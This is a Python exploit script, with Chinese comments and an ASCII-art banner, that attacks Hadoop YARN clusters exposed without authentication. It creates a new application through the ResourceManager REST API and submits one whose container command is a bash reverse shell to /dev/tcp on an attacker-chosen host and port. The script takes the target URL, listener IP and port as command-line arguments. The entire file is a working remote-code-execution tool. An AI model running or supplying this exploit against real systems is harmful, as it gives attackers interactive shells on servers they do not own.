"""
-*- coding: utf-8 -*-
@Project : Hadoop未授权getshell
@Author  : wodelilian
@Date    : 2023/3/8 15:04
Software : PyCharm
version  : Python 3.10
@File    : Hadoopgetshell.py
"""
import requests
import argparse

payload = 'ws/v1/cluster/apps/new-application'
print(
        f"Author: Wodelilian\n"
        f"                                                     ,--,              ,--,                                    \n"
        f"                                    ,---,          ,--.'|     ,--,   ,--.'|     ,--,                           \n"
        f"               .---.   ,---.      ,---.'|          |  | :   ,--.'|   |  | :   ,--.'|                     ,---,  \n"
        f"              /. ./|  '   ,'\     |   | :          :  : '   |  |,    :  : '   |  |,                  ,-+-. /  | \n"
        f"           .-'-. ' | /   /   |    |   | |   ,---.  |  ' |   `--'_    |  ' |   `--'_      ,--.--.    ,--.'|'   | \n"
        f"          /___/ \: |.   ; ,. :  ,--.__| |  /     \ '  | |   ,' ,'|   '  | |   ,' ,'|    /       \  |   |  , ' | \n"
        f"       .-'.. '   ' .'   | |: : /   ,'   | /    /  ||  | :   '  | |   |  | :   '  | |   .--.  .-. | |   | /  | | \n"
        f"      /___/ \:     ''   | .; :.   '  /  |.    ' / |'  : |__ |  | :   '  : |__ |  | :    \__\/: . . |   | |  | | \n"
        f"      .   \  ' .\   |   :    |'   ; |:  |'   ;   /||  | '.'|'  : |__ |  | '.'|'  : |__  ,  .--.; | |   | |  |/  \n"
        f"       \   \   ' \ | \   \  / |   | '/  ''   |  / |;  :    ;|  | '.'|;  :    ;|  | '.'|/  /  ,.  | |   | |--'   \n"
        f"        \   \  |--    `----'  |   :    :||   :    ||  ,   / ;  :    ;|  ,   / ;  :    ;  :   .'   \|   |/       \n"
        f"         \   \ |               \   \  /   \   \  /  ---`-'  |  ,   /  ---`-'  |  ,   /|  ,     .-./'---'        \n"
        f"          '---                  `----'     `----'            ---`-'            ---`-'  `--`---'                 \n"
    )


def getshell(target,lhost,lport):
    """
    :param target: 攻击目标
    :param lhost: 反弹shell IP
    :param lport: 反弹shell 端口
    :return: null
    """
    url = str(target) + str(payload)
    resp = requests.post(url)
    app_id = resp.json()['application-id']
    url = target + 'ws/v1/cluster/apps'
    data = {
        'application-id': app_id,
        'application-name': 'get-shell',
        'am-container-spec': {
            'commands': {
                'command': '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(lhost, lport),
            },
        },
        'application-type': 'YARN',
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        print("Payload发送成功，请检查shell是否反弹")
    else:
        print("Payload请求失败，程序已结束")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 Hadoopgetshell.py  -u [IP Address] -l[Reverse Host] -p [Reverse Prot(Default 9999)]',
        epilog='python3 -u http://192.168.0.1:8088/ -l 127.0.0.1 -p 9999')
    parser.add_argument('-u', '--url', help='IP Address')
    parser.add_argument('-l', '--lhost', help='Reverse Host')
    parser.add_argument('-p', '--port', default=9999, help='Reverse Prot(Default 9999)')
    args = parser.parse_args()
    target = args.url
    lhost = args.lhost
    lport = args.port
    try:
        if target == None or lhost == None or lport == None:
            print("请输检查输入的参数")
        else:
            print("开始尝试getshell：目标：{} 反弹shell地址：{}:{}".format(target, lhost, lport))
            getshell(target, lhost, lport)
    except :
        pass
